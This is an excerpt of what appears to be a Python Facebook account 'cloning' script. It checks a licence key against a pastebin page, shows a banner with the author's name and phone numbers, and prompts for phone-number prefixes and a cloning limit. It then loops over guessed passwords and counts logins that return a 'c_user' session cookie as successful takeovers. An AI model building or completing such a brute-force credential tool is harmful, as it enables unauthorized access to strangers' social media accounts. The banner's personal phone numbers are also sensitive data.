...
key = "|".join(uuid)
link = requests.get("https://pastebin.com/yHNRUtQm").text
if key in link:
   pass
else:
   print("Your key",key)
...
logo = """
\t\x1b[1;92m     _  _ ___   ___ _ _____ _  _ ___ 
 \t\x1b[1;92m   /_\ | \| / __| | __/_\_   _| || |_ _|
 \t\x1b[1;92m  / _ \| .` \__ \ | _/ _ \| | | __ || | 
 \t\x1b[1;92m /_/ \_\_|\_|___/ |_/_/ \_\_| |_||_|_
           


𝐘𝐎𝐍  : 𝐌𝐎𝐇𝐀𝐌𝐄𝐃 𝐀𝐌𝐄𝐑
  𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : 𝐌𝐎𝐇𝐀𝐌𝐄𝐃 𝐀𝐌𝐄𝐑
  𝐌𝐀𝐃𝐀𝐑 : 0916519990
  𝐌𝐔𝐁𝐀𝐑𝐌𝐀𝐘  :@XPMLTR
 𝐋𝐈𝐁𝐘𝐀𝐍𝐀  : 0921737458
  𝐇𝐈 : 𝐋 𝐋𝐎𝐕𝐄 𝐘𝐎𝐔                                         
...
def Tabii():
    ...
    print(f" 21892 ,21893 ,21894 ,21891")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    ...
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝐀𝐋𝐀𝐌𝐑] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
